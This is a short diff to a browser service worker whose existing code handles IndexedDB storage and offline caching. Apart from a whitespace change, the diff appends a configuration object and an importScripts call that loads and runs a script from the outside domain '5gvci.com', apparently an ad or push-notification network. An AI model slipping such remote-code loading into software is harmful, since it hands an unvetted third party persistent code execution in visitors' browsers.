@@ -57,7 +57,7 @@ async function swGetAll(storeName) {
         const rq = tx.objectStore(storeName).getAll();
         rq.onsuccess = () => res(rq.result);
         rq.onerror = () => rej(rq.error);
-    });
+    }); 
 }
 
 async function swDeleteKey(storeName, key) {
@@ -210,3 +210,11 @@ async function networkFirst(request, cacheName, timeout) {
         return new Response('Offline', { status: 503 });
     }
 }
+
+
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10630195
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
